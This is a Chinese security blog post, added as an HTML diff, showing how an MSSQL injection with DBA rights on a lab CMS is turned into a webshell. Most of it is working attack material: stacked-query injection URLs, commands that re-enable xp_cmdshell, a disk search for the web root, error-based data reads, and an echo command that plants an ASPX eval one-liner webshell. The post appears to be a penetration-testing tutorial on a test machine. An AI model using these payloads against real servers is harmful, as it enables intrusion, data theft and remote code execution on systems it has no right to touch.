@@ -1,0 +1,63 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> MSSQL DBA权限获取WEBSHELL的过程 · 浮萍's Blog</title><meta name="description" content="MSSQL DBA权限获取WEBSHELL的过程 - 浮萍"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="search" type="application/opensearchdescription+xml" href="https://fuping.site/atom.xml" title="浮萍's Blog"><script src="//code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="浮萍's Blog" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">主页</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">所有文章</a></li><li class="nav-list-item"><a href="/tags" target="_self" class="nav-list-link">标签</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">关于</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><li class="nav-list-item"><a href="/search" target="_self" class="nav-list-link search"><i class="fa fa-search" aria-hidden="true"></i></a></li></ul></header><main class="container"></main><div class="post"><article class="post-block"><h1 class="post-title">MSSQL DBA权限获取WEBSHELL的过程</h1><div class="post-info">May 16, 2017<span class="categories"><i class="fa fa-bookmark" aria-hidden="true"></i></span><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">#渗透测试</a></div><div class="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。<br>我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。</p>
+<a id="more"></a>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先找到一个如下的注入点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">' and 1=user;--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%B3%A8%E5%85%A5%E7%82%B9.png" alt="注入点"></p>
+<p>通过SQLMAP可以查看到是DBA权限</p>
+<p><img src="DBA%E6%9D%83%E9%99%90.png" alt="DBA权限"></p>
+<p>创建临时表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';CREATE TABLE tt_tmp (tmp1 varchar(8000));--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%88%9B%E5%BB%BA%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="创建临时表"></p>
+<p>在WINDOWS下查找文件用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录名:\ %i <span class="keyword">in</span> (匹配模式) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>
+<p>例如在C盘下搜索NewsList.aspx，可以使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>或者<code>for /r c:\ %i in (Newslist.aspx*) do @echo %i</code></p>
+<p>使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>的搜索结果<br><img src="%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%90%9C%E7%B4%A2%E6%96%B9%E5%BC%8F.png" alt="正确的搜索方式"></p>
+<p>一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。<br>使用<code>for /r c:\ %i in (Newslist.aspx) do @echo %i</code>的搜索结果</p>
+<p><img src="%E9%94%99%E8%AF%AF%E7%9A%84%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" alt="错误的搜索结果"></p>
+<p>用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';insert into tt_tmp(tmp1) exec master..xp_cmdshell '</span><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i <span class="string">';--</span></span><br></pre></td></tr></table></figure>
+
+<p>如果无法执行xp_cmdshell，并提示如下错误<code>SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。</code></p>
+<p><img src="%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cxp_cmdshell.png" alt="无法执行xp_cmdshell"></p>
+<p>可以使用如下命令来启用xp_cmdshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>
+<p>然后再次执行搜索命令。</p>
+<p><img src="%E6%89%A7%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%B9%B6%E7%BB%93%E6%9E%9C%E6%8F%92%E5%85%A5%E5%88%B0%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="执行搜索并结果插入到临时表"></p>
+<blockquote>
+<p>在执行上述搜索和插入过程后，可以使用<code>&#39; and (select(*) from tt_tmp)&gt;1</code>页面返回是否正常来判断是否有搜索结果。当没有找到的话，<code>select(*) from tt_tmp</code>的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如<code>&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\ %i in (Newslist*.aspx) do @echo %i &#39;;--</code>。也可以使用sqlmap来查看条数。</p>
+</blockquote>
+<p>可以用报错将表内容给显示出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp)and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure>
+<p><img src="%E6%8A%A5%E9%94%99%E8%AF%BB%E5%87%BA1.png" alt="报错读出1"></p>
+<p>继续爆</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('</span>c:\inetpub\wwwroot\manage\news\NewsList.aspx <span class="string">'))and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure>
+<p><img src="%E6%8A%A5%E9%94%99%E8%AF%BB%E5%87%BA2.png" alt="报错读出2"></p>
+<p>也可以用sqlmap直接将表中数据读取出来</p>
+<p><img src="%E5%AF%BC%E5%87%BA%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="导出临时表"></p>
+<p>然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。</p>
+<p>这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> <span class="built_in">test</span> &gt;c:\\WWW\\2333.txt<span class="string">';--</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问<a href="http://192.168.232.138:81/2333.txt" target="_blank" rel="noopener">http://192.168.232.138:81/2333.txt</a></p>
+<p><img src="%E6%9F%A5%E7%9C%8B%E5%86%99%E5%85%A5%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6.png" alt="查看写入的测试文件"></p>
+<p>成功访问，然后就是写一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> ^&lt;%@ Page Language=<span class="string">"Jscript"</span>%^&gt;^&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%^&gt; &gt; c:\\WWW\\233.aspx<span class="string">' ;--</span></span><br></pre></td></tr></table></figure>
+
+<p>成功写入。然后就是进一步的操作了，这里就不概述了。<br><img src="%E6%9F%A5%E7%9C%8B%E4%B8%80%E5%8F%A5%E8%AF%9D.png" alt="查看一句话"></p>
+<blockquote>
+<p>DOS命令将文件写入文本中时，遇到<code>&lt;&gt;</code>应在前面加上<code>^</code>。</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里一共有三个小的知识点:<br>1.sa用户如何开启xp_cmdshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>2.Windows下利用dos如何搜索文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist.aspx*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>
+
+<p>3.dos命令下写文件遇到<code>&lt;&gt;</code>如何处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; 123.txt</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="http://blog.csdn.net/cashey1991/article/details/44993403" target="_blank" rel="noopener">Windows命令行(cmd)下快速查找文件(类似Linux下find命令) </a><br>[2]<a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="noopener">技术分享：MSSQL注入xp_cmdshell</a></p>
+</div><p class="post-tags"><i class="fa fa-tags" aria-hidden="true"></i><a href="/tags/MSSQL/">#MSSQL</a><a href="/tags/WEBSHELL/">#WEBSHELL</a><a href="/tags/ASPX/">#ASPX</a></p></article></div><footer><div class="paginator"><a href="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/" class="prev">PREV</a><a href="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2020 <a href="https://fuping.site">浮萍</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-103156844-1",'auto');ga('send','pageview');</script><link rel="stylesheet" href="//cdn.datatables.net/1.10.7/css/jquery.dataTables.min.css" media="screen" type="text/css"><script src="//cdn.datatables.net/1.10.7/js/jquery.dataTables.min.js"></script><script>$(function(){$('.datatable').dataTable( {"order": [[ 0, "desc" ]],"iDisplayLength": -1,"lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]]} );});</script></body></html>
